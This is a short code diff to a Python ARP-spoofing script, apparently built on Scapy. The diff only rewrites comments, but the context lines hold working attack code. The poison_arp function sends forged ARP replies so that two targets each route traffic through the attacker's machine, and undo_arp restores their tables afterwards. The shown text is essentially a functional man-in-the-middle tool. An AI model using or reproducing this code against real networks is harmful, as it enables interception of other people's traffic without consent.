@@ -8,7 +8,7 @@ def undo_arp(ip1, ip2):
     print("\n[*] Restoring Targets...")
     target1_mac = get_mac(ip1)
     target2_mac = get_mac(ip2)
-    # undo ARP tables by broadcasting previous values
+    # undo ARP tables tampering by broadcasting previous MAC values
     send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
     send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
 
@@ -19,7 +19,7 @@ def undo_arp(ip1, ip2):
 
 
 def poison_arp(target1_mac, ip1, target2_mac, ip2):
-    # tell each value that our machine has the IP of the other, resulting a ARP update on both machine
+    # tells each target that our machine has the IP of the other, resulting in an ARP table update on both machines
     send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst=target1_mac))
     send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst=target2_mac))
 
